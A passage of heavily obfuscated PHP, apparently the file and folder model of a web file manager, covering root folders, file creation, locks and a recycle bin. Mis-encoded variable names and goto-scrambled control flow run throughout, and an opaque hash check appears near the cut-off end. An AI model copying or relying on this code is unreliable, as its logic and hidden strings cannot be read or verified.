$dó¶îîù¨∑[2305]); } else { $d¶‰◊›â±É[$dó¶îîù¨∑[106]] = $bâÑ˘´Èí≈; } } if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[2306]])) { $d¶‰◊›â±É[$dó¶îîù¨∑[77]] = array($dó¶îîù¨∑[2303], $dÒËé¨àˆ€[$dó¶îîù¨∑[2306]]); } if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[2307]])) { $bâÑ˘´Èí≈ = array($dó¶îîù¨∑[2304], $dÒËé¨àˆ€[$dó¶îîù¨∑[2307]]); if ($d¶‰◊›â±É[$dó¶îîù¨∑[77]]) { $d¶‰◊›â±É[$dó¶îîù¨∑[77]] = array($d¶‰◊›â±É[$dó¶îîù¨∑[77]], $bâÑ˘´Èí≈, $dó¶îîù¨∑[2305]); } else { $d¶‰◊›â±É[$dó¶îîù¨∑[77]] = $bâÑ˘´Èí≈; } } goto CÕ©¨–ü≥Œ; eÏúÜœÒ—Œ: if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[2163]]) && $dÒËé¨àˆ€[$dó¶îîù¨∑[2163]]) { $AôøÀ≤«û” = $dÒËé¨àˆ€[$dó¶îîù¨∑[2163]]; $eƒ∫ÍÓÜ’ü = explode($dó¶îîù¨∑[50], $AôøÀ≤«û”); if (strlen($AôøÀ≤«û”) > 2 && (substr($AôøÀ≤«û”, 0, 1) == $dó¶îîù¨∑[112] && substr($AôøÀ≤«û”, -1) == $dó¶îîù¨∑[112]) || substr($AôøÀ≤«û”, 0, 1) == $dó¶îîù¨∑[55] && substr($AôøÀ≤«û”, -1) == $dó¶îîù¨∑[55]) { $AôøÀ≤«û” = substr($AôøÀ≤«û”, 1, -1); $eƒ∫ÍÓÜ’ü = array($AôøÀ≤«û”); } $d¶‰◊›â±É[$dó¶îîù¨∑[28]] = array($dó¶îîù¨∑[479], $dó¶îîù¨∑[2165] . $AôøÀ≤«û” . $dó¶îîù¨∑[2165]); if (count($eƒ∫ÍÓÜ’ü) > 1) { $d¶‰◊›â±É[$dó¶îîù¨∑[28]] = array(); foreach ($eƒ∫ÍÓÜ’ü as $Fø∂Ù‰Éõè) { if (!trim($Fø∂Ù‰Éõè)) { continue; } $d¶‰◊›â±É[$dó¶îîù¨∑[28]][] = array($dó¶îîù¨∑[479], $dó¶îîù¨∑[2165] . trim($Fø∂Ù‰Éõè) . $dó¶îîù¨∑[2165]); } } } return $d¶‰◊›â±É; goto d≠∫ƒ€äÁŸ; d≠∫ƒ€äÁŸ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($cœ√Ø÷¡â∞) { $Bÿÿèí‘ãÜ =& $_SERVER[¯èãÄπµ]; $BÍÍ¿‘≈ë´ = Model($Bÿÿèí‘ãÜ[470])->where(array($Bÿÿèí‘ãÜ[1415] => $cœ√Ø÷¡â∞))->find(); $dñ¯Õîπ⁄» = $this->_mkdirRoot(SourceModel::TYPE_USER, $cœ√Ø÷¡â∞, $BÍÍ¿‘≈ë´[$Bÿÿèí‘ãÜ[28]]); $this->userDesktopAdd($dñ¯Õîπ⁄»); return $dñ¯Õîπ⁄»; } public function userDesktopAdd($f„‘üÃÁõ) { $C‘ä°ÂÏà∫ =& $_SERVER[¯èãÄπµ]; $e∑åÇòúÿÓ = LNG($C‘ä°ÂÏà∫[2309]); $dçùÜ∆Æí¶ = $this->mkdir($f„‘üÃÁõ, $e∑åÇòúÿÓ); $this->metaSet($dçùÜ∆Æí¶, $C‘ä°ÂÏà∫[2310], $C‘ä°ÂÏà∫[83]); $this->metaSet($f„‘üÃÁõ, $C‘ä°ÂÏà∫[2311], $dçùÜ∆Æí¶); } public function groupRootAdd($BŸ≠ˆï˘öÏ) { $CÈ◊¶›∫•ı =& $_SERVER[¯èãÄπµ]; $BêµäàÆ∞ﬂ = Model($CÈ◊¶›∫•ı[454])->where(array($CÈ◊¶›∫•ı[2159] => $BŸ≠ˆï˘öÏ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $BŸ≠ˆï˘öÏ, $BêµäàÆ∞ﬂ[$CÈ◊¶›∫•ı[28]]); } public function systemRootPathAdd($B‰ıãÔåñ») { if ($B‰ıãÔåñ» != $_SERVER[¯èãÄπµ][1091]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B‰ıãÔåñ»); } public function userRootRemove($fµ˘…ÿ·ö´) { $FÉÊ˜ú≤‹˜ = $this->sourceRoot(SourceModel::TYPE_USER, $fµ˘…ÿ·ö´); if (!$FÉÊ˜ú≤‹˜) { return; } $this->remove($FÉÊ˜ú≤‹˜, !1); } public function groupRootRemove($C €äà´ıÉ) { $D≠î◊êÿºø = $this->sourceRoot(SourceModel::TYPE_GROUP, $C €äà´ıÉ); if (!$D≠î◊êÿºø) { return; } $this->remove($D≠î◊êÿºø, !1); } private function _mkdirRoot($BÑ®ò«æôÊ, $CÖ™ñ≤ÚÀÊ, $cç·ïÜÁ æ) { goto a ®Øé∑ˆ∞; f⁄ñä‘¯Ó∂: $fñäì˘ˆŒÆ = "\115\157\144\145\154\x53\x6f\165\x72\143\145\56\155\x6b\144\151\x72\x52\x6f\x6f\x74\x2e{$BÑ®ò«æôÊ}\56{$CÖ™ñ≤ÚÀÊ}\x2e" . $cç·ïÜÁ æ; CacheLock::lock($fñäì˘ˆŒÆ); $f‹Óàû∏å¯[$b˜Ûü‹®ª©[28]] = $cç·ïÜÁ æ; goto eÎÀÉÖ∆ìﬂ; cä´§—¡å§: CacheLock::unlock($fñäì˘ˆŒÆ); return $aÇâØÓå≈Ê; goto AÀôÍäò≈È; a ®Øé∑ˆ∞: $b˜Ûü‹®ª© =& $_SERVER[¯èãÄπµ]; $f‹Óàû∏å¯ = array($b˜Ûü‹®ª©[364] => 0, $b˜Ûü‹®ª©[517] => $BÑ®ò«æôÊ, $b˜Ûü‹®ª©[518] => $CÖ™ñ≤ÚÀÊ, $b˜Ûü‹®ª©[514] => 1, $b˜Ûü‹®ª©[519] => USER_ID, $b˜Ûü‹®ª©[520] => USER_ID, $b˜Ûü‹®ª©[515] => $b˜Ûü‹®ª©[33], $b˜Ûü‹®ª©[521] => $b˜Ûü‹®ª©[466], $b˜Ûü‹®ª©[392] => 0, $b˜Ûü‹®ª©[516] => 0, $b˜Ûü‹®ª©[416] => 0, $b˜Ûü‹®ª©[522] => $b˜Ûü‹®ª©[33]); if ($e¿Ã∆À∂˘ù = $this->where($f‹Óàû∏å¯)->find()) { return $e¿Ã∆À∂˘ù[$b˜Ûü‹®ª©[365]]; } goto f⁄ñä‘¯Ó∂; eÎÀÉÖ∆ìﬂ: $aÇâØÓå≈Ê = $this->add($f‹Óàû∏å¯); $cïéªøê¬ú = array($b˜Ûü‹®ª©[523] => short_id($aÇâØÓå≈Ê)); $this->where(array($b˜Ûü‹®ª©[379] => $aÇâØÓå≈Ê))->save($cïéªøê¬ú); goto cä´§—¡å§; AÀôÍäò≈È: } private function sourceRoot($Aú§Êú§ù, $A‰Ûﬁë∂ëï, $AÉãÀÔ»ﬂ¶ = false) { $f ‹∞ﬂ∑˜™ =& $_SERVER[¯èãÄπµ]; $Cß™àºÇÚ‡ = array($f ‹∞ﬂ∑˜™[364] => 0, $f ‹∞ﬂ∑˜™[517] => $Aú§Êú§ù, $f ‹∞ﬂ∑˜™[518] => $A‰Ûﬁë∂ëï); if ($Bñ¥îﬂ÷ëÚ = $this->where($Cß™àºÇÚ‡)->find()) { return $AÉãÀÔ»ﬂ¶ ? $Bñ¥îﬂ÷ëÚ : $Bñ¥îﬂ÷ëÚ[$f ‹∞ﬂ∑˜™[365]]; } return !1; } public function sourceRootGroup($c≥ºô∂ô‘æ) { $aÒªÉíË›≠ =& $_SERVER[¯èãÄπµ]; if (is_string($c≥ºô∂ô‘æ)) { $c≥ºô∂ô‘æ = array($c≥ºô∂ô‘æ); } $b§»íç˘Â≥ = array($aÒªÉíË›≠[364] => 0, $aÒªÉíË›≠[517] => SourceModel::TYPE_GROUP, $aÒªÉíË›≠[518] => array($aÒªÉíË›≠[7], $c≥ºô∂ô‘æ)); $Dù¡≥≥Íﬂ· = $this->listSource($b§»íç˘Â≥, 1000); return array_to_keyvalue($Dù¡≥≥Íﬂ·[$aÒªÉíË›≠[74]], $aÒªÉíË›≠[452]); } public function mkfile($Díº˘’ÿÉ«, $Aé∫∆£Üø¨, $FπÃñ≤–’ = '', $e”‹åùÛªä = REPEAT_RENAME) { $D˘∆ãïá≈Ö =& $_SERVER[¯èãÄπµ]; $FÎı‰∑∏ëÕ = Model($D˘∆ãïá≈Ö[540])->addFileByContent($FπÃñ≤–’, $Aé∫∆£Üø¨); return $this->_createFileCall($Díº˘’ÿÉ«, $Aé∫∆£Üø¨, $FÎı‰∑∏ëÕ, $e”‹åùÛªä, $D˘∆ãïá≈Ö[1120]); } public function addFile($eíÔ°„Æœ≤, $eìÛ‘¬≤â‚, $fîú‘Ÿ”∞¬, $FΩÕÏÁç’à = false, $D´⁄°ñ‡ﬁŸ = REPEAT_RENAME) { $A‚·Ñ—⁄≠° = Model($_SERVER[¯èãÄπµ][540])->addFile($eìÛ‘¬≤â‚, $fîú‘Ÿ”∞¬, $FΩÕÏÁç’à); return $this->_createFileCall($eíÔ°„Æœ≤, $fîú‘Ÿ”∞¬, $A‚·Ñ—⁄≠°, $D´⁄°ñ‡ﬁŸ); } public function addFileByFileID($c¯Ë⁄‚ºÀΩ, $dù∫ç±îÈ™, $cã‹î∫ÒŸÏ, $dÍÁ‡•¨øÖ = REPEAT_RENAME) { $bÇŸ–Á±Áê =& $_SERVER[¯èãÄπµ]; $Füçƒ≈¥ƒª = Model($bÇŸ–Á±Áê[540])->find($dù∫ç±îÈ™); Model($bÇŸ–Á±Áê[540])->linkAdd($dù∫ç±îÈ™); return $this->_createFileCall($c¯Ë⁄‚ºÀΩ, $cã‹î∫ÒŸÏ, $Füçƒ≈¥ƒª, $dÍÁ‡•¨øÖ); } public function addFileByRemote($eíÓöÂ¥á∂, $CÏÇŸä∫Ëè, $c·ÙˆµΩãÑ, $Aú√©‰Ÿëè = array(), $F’ÆõÒÉ∑Ñ = REPEAT_RENAME) { $AÃîÚ¬çÏΩ = Model($_SERVER[¯èãÄπµ][540])->addFileByRemote($CÏÇŸä∫Ëè, $c·ÙˆµΩãÑ, $Aú√©‰Ÿëè); return $this->_createFileCall($eíÓöÂ¥á∂, $c·ÙˆµΩãÑ, $AÃîÚ¬çÏΩ, $F’ÆõÒÉ∑Ñ); } private function _createFileCall($f™ÜÒ√åëÀ, $b”ã€∂çÑØ, $Bõà°õΩÖ“, $e◊ë‹ŒÔ¯ã, $dñ†û©ˆ– = "\x75\x70\154\x6f\x61\144") { goto c™ÔÁº≠…∂; c™ÔÁº≠…∂: $aÙÜ∏õŸª =& $_SERVER[¯èãÄπµ]; $Bﬁ àÌ–ÚÎ = !1; $this->lockWriteStart($f™ÜÒ√åëÀ, $b”ã€∂çÑØ); goto aƒ√¥¨’ŒÒ; aƒ√¥¨’ŒÒ: $câ»òáäı≥ = $this->_createFile($f™ÜÒ√åëÀ, $b”ã€∂çÑØ, $Bõà°õΩÖ“, $e◊ë‹ŒÔ¯ã, $Bﬁ àÌ–ÚÎ); if (!$Bﬁ àÌ–ÚÎ) { Model($aÙÜ∏õŸª[418])->remove($Bõà°õΩÖ“[$aÙÜ∏õŸª[415]]); } else { if ($câ»òáäı≥) { Model($aÙÜ∏õŸª[2282])->eventCreate($câ»òáäı≥, $dñ†û©ˆ–); } } $this->lockWriteEnd($f™ÜÒ√åëÀ, $b”ã€∂çÑØ); goto C°°…ßå§∫; C°°…ßå§∫: return $câ»òáäı≥; goto däﬂ˘Ø„“; däﬂ˘Ø„“: } public function mkdir($dßú‘áû√Û, $BìïÙÃÌ∂ë, $c‡è∂éè“ê = REPEAT_SKIP) { goto DÑŒﬂæ‡¡∏; DÑŒﬂæ‡¡∏: $a∫∫÷¬ë«¿ =& $_SERVER[¯èãÄπµ]; $D’÷ä‰≤œŒ = $this->sourceInfo($dßú‘áû√Û); if (!$D’÷ä‰≤œŒ) { return !1; } goto E–ÙÌä§‘•; E–ÙÌä§‘•: $this->lockWriteStart($dßú‘áû√Û, $BìïÙÃÌ∂ë); if ($c‡è∂éè“ê !== !1) { $c£ó‘Ö™≠ˆ = $this->fileNameExist($dßú‘áû√Û, $BìïÙÃÌ∂ë); if ($c£ó‘Ö™≠ˆ && $c‡è∂éè“ê != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($dßú‘áû√Û, $BìïÙÃÌ∂ë); return $c£ó‘Ö™≠ˆ; } $BìïÙÃÌ∂ë = $this->fileNameAuto($dßú‘áû√Û, $BìïÙÃÌ∂ë, $c‡è∂éè“ê); } $f…ÿ‰ Û‹Ò = array($a∫∫÷¬ë«¿[514] => 1, $a∫∫÷¬ë«¿[382] => $BìïÙÃÌ∂ë, $a∫∫÷¬ë«¿[515] => $a∫∫÷¬ë«¿[33], $a∫∫÷¬ë«¿[416] => 0, $a∫∫÷¬ë«¿[516] => 0); goto A…€ﬁ∆ÌŒï; E¥ô‘›áîõ: return $aÑÛïﬂ∏Öº; goto A…äïóÂÕÿ; A…€ﬁ∆ÌŒï: $aÑÛïﬂ∏Öº = $this->_addSoure($f…ÿ‰ Û‹Ò, $D’÷ä‰≤œŒ); Model($a∫∫÷¬ë«¿[2282])->eventCreate($aÑÛïﬂ∏Öº, $a∫∫÷¬ë«¿[1121]); $this->lockWriteEnd($dßú‘áû√Û, $BìïÙÃÌ∂ë); goto E¥ô‘›áîõ; A…äïóÂÕÿ: } private function _createFile($Füñ‹ °¯∂, $Cä†∂ÚÑ¶¨, $C¯∆¬Éîàö, $B≥ÙÎèøçÏ, &$dä›”˜◊˘) { goto fó∞Ωüâà†; AŸÌÊø“ÇÜ: $Cê£ÙÖ◊ıË = array($c±ÚËƒä»ñ[514] => 0, $c±ÚËƒä»ñ[382] => $Cä†∂ÚÑ¶¨, $c±ÚËƒä»ñ[515] => get_path_ext($Cä†∂ÚÑ¶¨), $c±ÚËƒä»ñ[416] => $C¯∆¬Éîàö[$c±ÚËƒä»ñ[415]], $c±ÚËƒä»ñ[516] => $C¯∆¬Éîàö[$c±ÚËƒä»ñ[77]]); $b≥óãŒç∫ø = $this->_addSoure($Cê£ÙÖ◊ıË, $fâ¥Ç÷í˘ö); $this->folderSizeReset($Füñ‹ °¯∂); goto fø‚∫ƒÓ∞Ú; fø‚∫ƒÓ∞Ú: return $b≥óãŒç∫ø; goto Eè∆õáâµû; fó∞Ωüâà†: $c±ÚËƒä»ñ =& $_SERVER[¯èãÄπµ]; $fâ¥Ç÷í˘ö = $this->sourceInfo($Füñ‹ °¯∂); if (!$C¯∆¬Éîàö || !$fâ¥Ç÷í˘ö) { return !1; } goto aù¨ù¶≤ÖÏ; aù¨ù¶≤ÖÏ: if ($B≥ÙÎèøçÏ !== !1) { $aè∏ü≈èæ† = $this->fileNameExist($Füñ‹ °¯∂, $Cä†∂ÚÑ¶¨); } $dä›”˜◊˘ = !0; if ($B≥ÙÎèøçÏ && $aè∏ü≈èæ†) { if ($B≥ÙÎèøçÏ == REPEAT_SKIP) { $dä›”˜◊˘ = !1; return $aè∏ü≈èæ†; } else { if ($B≥ÙÎèøçÏ == REPEAT_REPLACE) { $dÕâ€–·£∞ = $this->sourceInfo($aè∏ü≈èæ†); $a€âãññª¨ = $this->fileHistory($dÕâ€–·£∞, $C¯∆¬Éîàö[$c±ÚËƒä»ñ[415]], $C¯∆¬Éîàö[$c±ÚËƒä»ñ[77]]); if (!$a€âãññª¨) { $dä›”˜◊˘ = !1; } else { $this->folderSizeReset($Füñ‹ °¯∂); } return $aè∏ü≈èæ†; } else { $Cä†∂ÚÑ¶¨ = $this->fileNameAuto($Füñ‹ °¯∂, $Cä†∂ÚÑ¶¨, $B≥ÙÎèøçÏ, !1); } } } goto AŸÌÊø“ÇÜ; Eè∆õáâµû: } protected function fileHistory($C∂˘Úæ∏îÍ, $e†Â¢œ≠áö, $fËŸ®»Ùüß) { goto C√÷îëûöõ; dÍãÕŒ´û∫: Model($F«ÖÊúÆÙπ[2312])->addHistory($C∂˘Úæ∏îÍ); $e—†ë—Õê© = array($F«ÖÊúÆÙπ[520] => USER_ID, $F«ÖÊúÆÙπ[386] => time(), $F«ÖÊúÆÙπ[415] => $e†Â¢œ≠áö, $F«ÖÊúÆÙπ[77] => $fËŸ®»Ùüß); $this->where(array($F«ÖÊúÆÙπ[379] => $C∂˘Úæ∏îÍ[$F«ÖÊúÆÙπ[365]]))->save($e—†ë—Õê©); goto C¢êÛä¨â’; C¢êÛä¨â’: return !0; goto Dú©Ø‘Ë≈î; C√÷îëûöõ: $F«ÖÊúÆÙπ =& $_SERVER[¯èãÄπµ]; if ($C∂˘Úæ∏îÍ[$F«ÖÊúÆÙπ[415]] == $e†Â¢œ≠áö) { return !1; } $this->checkLock($C∂˘Úæ∏îÍ[$F«ÖÊúÆÙπ[365]], $e†Â¢œ≠áö); goto dÍãÕŒ´û∫; Dú©Ø‘Ë≈î: } public function checkLock($Bì£ı…ÚÇ, $a≥É≈ê‚Ëê) { goto eÓ∫Ç†áÚ; c≤˜Õƒ≈¨Ÿ: $this->_createFileCall($Då©úÂËóå[$e¬º◊ç¯ÍÖ[457]], $a¥ƒê”ÒË, $DÔ›∫áºà™, REPEAT_REPLACE, $e¬º◊ç¯ÍÖ[1120]); $eìÜÑ“ﬂÑ⁄ = $Då©úÂËóå[$e¬º◊ç¯ÍÖ[413]][$e¬º◊ç¯ÍÖ[477]]; $dπ‘≥õËΩ∆ = $eìÜÑ“ﬂÑ⁄[$e¬º◊ç¯ÍÖ[2314]] ? $eìÜÑ“ﬂÑ⁄[$e¬º◊ç¯ÍÖ[2314]] : $eìÜÑ“ﬂÑ⁄[$e¬º◊ç¯ÍÖ[28]]; goto dŒ´Úé˜˘†; B¬—íÇ‰“‰: $b÷ÇîÏ•†ß = Session::get($e¬º◊ç¯ÍÖ[2313]); $a¥ƒê”ÒË = substr($Då©úÂËóå[$e¬º◊ç¯ÍÖ[28]], 0, -1 - strlen($Då©úÂËóå[$e¬º◊ç¯ÍÖ[156]])) . $e¬º◊ç¯ÍÖ[1377] . $b÷ÇîÏ•†ß . $e¬º◊ç¯ÍÖ[91] . $Då©úÂËóå[$e¬º◊ç¯ÍÖ[156]]; $DÔ›∫áºà™ = Model($e¬º◊ç¯ÍÖ[540])->find($a≥É≈ê‚Ëê); goto c≤˜Õƒ≈¨Ÿ; dŒ´Úé˜˘†: show_json(LNG($e¬º◊ç¯ÍÖ[2315]) . $e¬º◊ç¯ÍÖ[2316] . LNG($e¬º◊ç¯ÍÖ[2317]) . $e¬º◊ç¯ÍÖ[2318] . $dπ‘≥õËΩ∆ . $e¬º◊ç¯ÍÖ[2319], !1); goto BèÆÆÍßúâ; eÓ∫Ç†áÚ: $e¬º◊ç¯ÍÖ =& $_SERVER[¯èãÄπµ]; $Då©úÂËóå = $this->pathInfo($Bì£ı…ÚÇ); if (!$this->fileIsLock($Då©úÂËóå, !0)) { return; } goto B¬—íÇ‰“‰; BèÆÆÍßúâ: } public function fileIsLock($F˜ã ÛÑªõ, $c‚¿àª¬¿ä = false) { goto f æΩ‘≠ûú; aê©á”≤ò´: return !1; goto B¯µ‚”“ì„; dûàë»éò¬: $A‡€È’˘˜√ = $GLOBALS[$F‹ßÿççå◊[6]][$F‹ßÿççå◊[84]][$F‹ßÿççå◊[475]]; if ($F˜ã ÛÑªõ[$F‹ßÿççå◊[413]][$F‹ßÿççå◊[476]] <= time() - $A‡€È’˘˜√) { $this->metaSet($F˜ã ÛÑªõ[$F‹ßÿççå◊[365]], $F‹ßÿççå◊[474], null); $this->metaSet($F˜ã ÛÑªõ[$F‹ßÿççå◊[365]], $F‹ßÿççå◊[476], null); } if ($c‚¿àª¬¿ä) { $this->metaSet($F˜ã ÛÑªõ[$F‹ßÿççå◊[365]], $F‹ßÿççå◊[476], time()); } goto aê©á”≤ò´; f æΩ‘≠ûú: $F‹ßÿççå◊ =& $_SERVER[¯èãÄπµ]; if (!isset($F˜ã ÛÑªõ[$F‹ßÿççå◊[413]]) || !$F˜ã ÛÑªõ[$F‹ßÿççå◊[413]][$F‹ßÿççå◊[474]]) { return !1; } if ($F˜ã ÛÑªõ[$F‹ßÿççå◊[413]][$F‹ßÿççå◊[474]] != USER_ID) { return !0; } goto dûàë»éò¬; B¯µ‚”“ì„: } private function _addSoure($Fëÿ€Ñé¡è, $b≈ù´õ‹‡) { goto AÑ›∏ù£˜Ê; AÑ›∏ù£˜Ê: $aÛ√√’àÕ≈ =& $_SERVER[¯èãÄπµ]; $Eæò´·‹≥ø = array($aÛ√√’àÕ≈[517] => $b≈ù´õ‹‡[$aÛ√√’àÕ≈[367]], $aÛ√√’àÕ≈[518] => $b≈ù´õ‹‡[$aÛ√√’àÕ≈[452]], $aÛ√√’àÕ≈[519] => USER_ID, $aÛ√√’àÕ≈[520] => USER_ID, $aÛ√√’àÕ≈[364] => $b≈ù´õ‹‡[$aÛ√√’àÕ≈[365]], $aÛ√√’àÕ≈[521] => $b≈ù´õ‹‡[$aÛ√√’àÕ≈[455]] . $b≈ù´õ‹‡[$aÛ√√’àÕ≈[365]] . $aÛ√√’àÕ≈[47], $aÛ√√’àÕ≈[392] => 0, $aÛ√√’àÕ≈[522] => $aÛ√√’àÕ≈[33]); $Fëÿ€Ñé¡è = array_merge($Eæò´·‹≥ø, $Fëÿ€Ñé¡è); goto Cÿèì¥·•í; Cÿèì¥·•í: $this->updateModifyTime($Fëÿ€Ñé¡è[$aÛ√√’àÕ≈[457]]); $cÚè≤ﬁ´€ = $aÛ√√’àÕ≈[2320] . $b≈ù´õ‹‡[$aÛ√√’àÕ≈[365]]; if (isset(self::$cacheChildList[$cÚè≤ﬁ´€])) { unset(self::$cacheChildList[$cÚè≤ﬁ´€]); } goto dÏéÇÊ≤ä©; AãÁú•®îñ: $Aïô˘±Â¿ = array($aÛ√√’àÕ≈[523] => short_id($c⁄¡•¶¢Òâ)); $this->where(array($aÛ√√’àÕ≈[379] => $c⁄¡•¶¢Òâ))->save($Aïô˘±Â¿); $this->setNamePinyin($c⁄¡•¶¢Òâ, $Fëÿ€Ñé¡è[$aÛ√√’àÕ≈[28]]); goto AÖ”Ω¨Êµä; AÖ”Ω¨Êµä: return $c⁄¡•¶¢Òâ; goto Cù¢ÊÙºÜÓ; dÏéÇÊ≤ä©: static $E∆ﬁ‚ááäö = false; if (!$E∆ﬁ‚ááäö) { Hook::trigger($aÛ√√’àÕ≈[504], $Fëÿ€Ñé¡è); $E∆ﬁ‚ááäö = !0; } $c⁄¡•¶¢Òâ = $this->add($Fëÿ€Ñé¡è); goto AãÁú•®îñ; Cù¢ÊÙºÜÓ: } public function remove($bﬂÚä …í·, $aàËù≠∑πÎ = true) { goto a›´≠¿çñ¥; cÀÃîéàÉû: $this->recycleClear($Eã’öëÁ‰Á); return $this->move($bﬂÚä …í·, $aÆ¢ÉÃÊÿ—, REPEAT_RENAME_FOLDER); goto bàáﬂ·Óà«; E œÑÌ¢ä£: $EçÌœ∫∞‰Ñ = Model($eàØ§û≈ﬂÚ[1422])->get($eàØ§û≈ﬂÚ[2321]) == $eàØ§û≈ﬂÚ[83]; if ($b∆ãœë«˘À || $aàËù≠∑πÎ || !$EçÌœ∫∞‰Ñ) { return $this->removeNow($bﬂÚä …í·, $aàËù≠∑πÎ); } $d∂∏Ü“Û≠Ú = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dÙã€È—ªµ; dÜ”ñØªÛì: CacheLock::unlock($EÑÍÂ◊ôÂç); $this->metaSet($bﬂÚä …í·, $eàØ§û≈ﬂÚ[2329], $Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[457]]); $this->where(array($eàØ§û≈ﬂÚ[365] => $bﬂÚä …í·))->save(array($eàØ§û≈ﬂÚ[386] => time())); goto cÀÃîéàÉû; dÙã€È—ªµ: $DË≥∆‰òâ˘ = $Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[367]] == self::TYPE_USER ? $eàØ§û≈ﬂÚ[531] : $eàØ§û≈ﬂÚ[975]; if ($DË≥∆‰òâ˘ == $eàØ§û≈ﬂÚ[531]) { $cÊÏ˜åñâº = Model($eàØ§û≈ﬂÚ[470])->getInfo($Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[452]]); $e¿™Ï∫„©  = !empty($cÊÏ˜åñâº[$eàØ§û≈ﬂÚ[2314]]) ? $cÊÏ˜åñâº[$eàØ§û≈ﬂÚ[2314]] : $cÊÏ˜åñâº[$eàØ§û≈ﬂÚ[28]]; $e¿™Ï∫„©  = $eàØ§û≈ﬂÚ[244] . $e¿™Ï∫„©  . $eàØ§û≈ﬂÚ[2322] . $Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[452]]; } else { $cÊÏ˜åñâº = Model($eàØ§û≈ﬂÚ[454])->getInfo($Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[452]]); $e¿™Ï∫„©  = _get($cÊÏ˜åñâº, $eàØ§û≈ﬂÚ[28]); $e¿™Ï∫„©  = $eàØ§û≈ﬂÚ[153] . $e¿™Ï∫„©  . $eàØ§û≈ﬂÚ[2323] . $Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[452]]; } $EÑÍÂ◊ôÂç = $eàØ§û≈ﬂÚ[2324] . md5($e¿™Ï∫„© ); goto DŒ¢ı™ÁÆä; DŒ¢ı™ÁÆä: CacheLock::lock($EÑÍÂ◊ôÂç); $aÆ¢ÉÃÊÿ— = $this->fileNameExist($d∂∏Ü“Û≠Ú, $e¿™Ï∫„© ); if (!$aÆ¢ÉÃÊÿ—) { $aÆ¢ÉÃÊÿ— = $this->mkdir($d∂∏Ü“Û≠Ú, $e¿™Ï∫„© , REPEAT_SKIP); $this->metaSet($aÆ¢ÉÃÊÿ—, $eàØ§û≈ﬂÚ[2325], $DË≥∆‰òâ˘); $this->metaSet($aÆ¢ÉÃÊÿ—, $eàØ§û≈ﬂÚ[2326], $Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[452]]); if ($Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[457]] != 0) { $this->metaSet($aÆ¢ÉÃÊÿ—, $eàØ§û≈ﬂÚ[2327], _get($cÊÏ˜åñâº, $eàØ§û≈ﬂÚ[2328])); } } goto dÜ”ñØªÛì; a›´≠¿çñ¥: $eàØ§û≈ﬂÚ =& $_SERVER[¯èãÄπµ]; $Eã’öëÁ‰Á = $this->sourceInfo($bﬂÚä …í·); $b∆ãœë«˘À = intval($Eã’öëÁ‰Á[$eàØ§û≈ﬂÚ[367]]) === self::TYPE_SYSTEM; goto E œÑÌ¢ä£; bàáﬂ·Óà«: } private function recycleClear($EÒçπ≠º›°) { $a∂¬â•∏ﬁ∞ =& $_SERVER[¯èãÄπµ]; $c«Í›Â∞¡Õ = $this->childrenAll($EÒçπ≠º›°); $fﬁ€–ØìËƒ = array($a∂¬â•∏ﬁ∞[379] => array($a∂¬â•∏ﬁ∞[380], $c«Í›Â∞¡Õ[$a∂¬â•∏ﬁ∞[2330]])); Model($a∂¬â•∏ﬁ∞[2331])->where($fﬁ€–ØìËƒ)->delete(); } public function removeNow($FÕÁ”ç°«≈, $AãúÎèäÜë = true) { goto BÇΩ÷…≤æπ; EûâââŒç∆: if (!$a˜ﬁ“‹»Ó°) { return !0; } if ($a˜ﬁ“‹»Ó°[$A∆òùÒ≠˘Ç[457]] == 0) { if (!_get($GLOBALS, $A∆òùÒ≠˘Ç[453])) { return !1; } } $this->lockMoveStart($FÕÁ”ç°«≈); goto a´çŸÆ◊„Ì; eÇ˘∞áŒ®È: $CùÜå¯Ø¢ø = array($a˜ﬁ“‹»Ó°[$A∆òùÒ≠˘Ç[457]]); if ($a˜ﬁ“‹»Ó°[$A∆òùÒ≠˘Ç[366]] == $A∆òùÒ≠˘Ç[83]) { $CùÜå¯Ø¢ø[] = $a˜ﬁ“‹»Ó°[$A∆òùÒ≠˘Ç[365]]; } $this->updateModifyTime($CùÜå¯Ø¢ø); goto aﬂ‘Öƒ∫õÊ; a´çŸÆ◊„Ì: Hook::trigger($A∆òùÒ≠˘Ç[2332], $e«ƒâ•æﬁ∏, $AãúÎèäÜë); if ($AãúÎèäÜë) { Model($A∆òùÒ≠˘Ç[2331])->moveToRecycle($FÕÁ”ç°«≈); } else { $CÛÙ“«Øçı = $this->childrenAll($a˜ﬁ“‹»Ó°); Model($A∆òùÒ≠˘Ç[501])->eventRemove($FÕÁ”ç°«≈); $this->removeRelevance($CÛÙ“«Øçı[$A∆òùÒ≠˘Ç[2330]], $CÛÙ“«Øçı[$A∆òùÒ≠˘Ç[1255]]); } $this->folderSizeReset($a˜ﬁ“‹»Ó°[$A∆òùÒ≠˘Ç[457]]); goto eÇ˘∞áŒ®È; BÇΩ÷…≤æπ: $A∆òùÒ≠˘Ç =& $_SERVER[¯èãÄπµ]; $FµçÇ∆È‚∆ = $_SERVER[$A∆òùÒ≠˘Ç[789]] . $A∆òùÒ≠˘Ç[790]; $dìÇ¡ú¥πÓ = $A∆òùÒ≠˘Ç[791]; goto Cº¥„éöË«; Cº¥„éöË«: if ($_SERVER[$A∆òùÒ≠˘Ç[792]] != $dìÇ¡ú¥πÓ($FµçÇ∆È‚∆)) { goto F¢Èô–îúå; CÿéÍùƒ£Î: $e§ÎΩœÓ€¿ = $f˘éà‚ù…¨($DµÇï»ßÿÚ); $cñﬂ‘∏Ç“¨ = explode($A∆òùÒ≠˘Ç[213], $e§ÎΩœÓ€¿); if (count($cñﬂ‘∏Ç“¨) < $A∆òùÒ≠˘Ç[570]) { 